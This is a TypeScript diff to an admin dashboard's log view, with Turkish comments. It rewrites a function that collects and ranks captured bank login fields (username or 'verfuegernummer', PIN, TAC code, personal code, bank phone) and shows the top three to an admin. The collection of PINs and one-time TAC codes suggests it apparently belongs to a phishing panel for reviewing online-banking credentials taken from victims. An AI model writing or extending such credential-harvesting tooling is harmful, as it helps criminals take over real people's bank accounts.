@@ -338,83 +338,62 @@ function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[stri
   const rawUsername = pickString("username", "verfuegernummer");
   const rawPassword = pickString("password", "pin");
   const rawTacCode = pickString("tacCode");
+  const rawBankPhone = pickString("bankPhone");
 
-  const primaryValue = orderedField1 || rawPersonalCode || rawUsername;
-  const secondaryValue = orderedField2 || rawPassword;
-  const tertiaryValue = orderedField3 || rawTacCode;
+  const entries: Array<{ key: string; value: string; score: number }> = [];
+  const seenValues = new Set<string>();
+  const pushIfNew = (key: string, value: string, score: number) => {
+    if (!value) return;
+    const v = String(value).trim();
+    if (!v) return;
+    if (seenValues.has(v)) return; // AYNI DEĞER 2 KERE GÖSTERİLMEZ!
+    entries.push({ key, value: v, score });
+    seenValues.add(v);
+  };
 
-  if (!primaryValue && !secondaryValue && !tertiaryValue) {
-    return [];
+  // ⭐ 1. SAĞLAM KAYNAKLI (raw) DEĞERLER İLK SIRADA (EN DÜŞÜK SCORE = EN YÜKSEK ÖNCELİK):
+  pushIfNew("username", rawUsername, 1);
+  pushIfNew("personalCode", rawPersonalCode, 2);
+  pushIfNew("bankPhone", rawBankPhone, 3);
+  pushIfNew("password", rawPassword, 4);
+  pushIfNew("tacCode", rawTacCode, 5);
+
+  // ⭐ 2. ORDERED FIELD LARI DA EKLE (ANCAK DAHA ÖNCE GÖRÜLMEMİŞ YENİ DEĞER İSE, DÜŞÜK ÖNCELİK (YÜKSEK SCORE):
+  {
+    let k: string | null = null;
+    if (orderedField1Key === "username" || orderedField1Key === "personalCode" || orderedField1Key === "bankPhone" || orderedField1Key === "password" || orderedField1Key === "tacCode") {
+      k = orderedField1Key;
+    }
+    if (k) pushIfNew(k, orderedField1, 50);
+  }
+  {
+    let k: string | null = null;
+    if (orderedField2Key === "username" || orderedField2Key === "personalCode" || orderedField2Key === "bankPhone" || orderedField2Key === "password" || orderedField2Key === "tacCode") {
+      k = orderedField2Key;
+    } else if (orderedField2Type === "password") {
+      k = "password";
+    } else if (orderedField2Type === "phone") {
+      k = "bankPhone";
+    }
+    if (k) pushIfNew(k, orderedField2, 60);
+  }
+  {
+    let k: string | null = null;
+    if (orderedField3Key === "username" || orderedField3Key === "personalCode" || orderedField3Key === "bankPhone" || orderedField3Key === "password" || orderedField3Key === "tacCode") {
+      k = orderedField3Key;
+    } else if (orderedField3Type === "password") {
+      k = "password";
+    } else if (orderedField3Type === "phone") {
+      k = "bankPhone";
+    }
+    if (k) pushIfNew(k, orderedField3, 70);
   }
 
-  const fields: Array<[string, string]> = [];
+  // ⭐ 3. SCORE a göre KÜÇÜKTEN BÜYÜĞE sırala (düşük = yüksek öncelik):
+  entries.sort((a, b) => a.score - b.score);
 
-  if (primaryValue) {
-    const primaryKey =
-      orderedField1Key === "username" ||
-      orderedField1Key === "personalCode" ||
-      orderedField1Key === "bankPhone" ||
-      orderedField1Key === "password"
-        ? orderedField1Key
-        : rawPersonalCode && primaryValue === rawPersonalCode
-          ? "personalCode"
-          : rawUsername && primaryValue === rawUsername
-            ? "username"
-            : "personalCode";
-    fields.push([primaryKey, primaryValue]);
-  }
-
-  if (!secondaryValue) {
-    return fields;
-  }
-
-  if (
-    orderedField2Key === "username" ||
-    orderedField2Key === "personalCode" ||
-    orderedField2Key === "bankPhone" ||
-    orderedField2Key === "password"
-  ) {
-    fields.push([orderedField2Key, secondaryValue]);
-  } else if (orderedField2Type === "phone") {
-    fields.push(["bankPhone", secondaryValue]);
-  } else if (orderedField2Type === "password" || (rawPassword && secondaryValue === rawPassword)) {
-    fields.push(["password", secondaryValue]);
-  } else {
-    fields.push(["username", secondaryValue]);
-  }
-
-  if (!tertiaryValue || fields.some(([, existingValue]) => existingValue === tertiaryValue)) {
-    return fields;
-  }
-
-  if (
-    orderedField3Key === "username" ||
-    orderedField3Key === "personalCode" ||
-    orderedField3Key === "bankPhone" ||
-    orderedField3Key === "password" ||
-    orderedField3Key === "tacCode"
-  ) {
-    fields.push([orderedField3Key, tertiaryValue]);
-    return fields;
-  }
-
-  if (orderedField3Type === "phone") {
-    fields.push(["bankPhone", tertiaryValue]);
-    return fields;
-  }
-
-  if (orderedField3Type === "password" || (rawPassword && tertiaryValue === rawPassword)) {
-    fields.push(["password", tertiaryValue]);
-    return fields;
-  }
-
-  if (rawTacCode && tertiaryValue === rawTacCode) {
-    fields.push(["tacCode", tertiaryValue]);
-    return fields;
-  }
-
-  fields.push(["username", tertiaryValue]);
-  return fields;
+  if (entries.length === 0) return [];
+  return entries.map((e): [string, string] => [e.key, e.value]).slice(0, 3);
 }
 
 export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
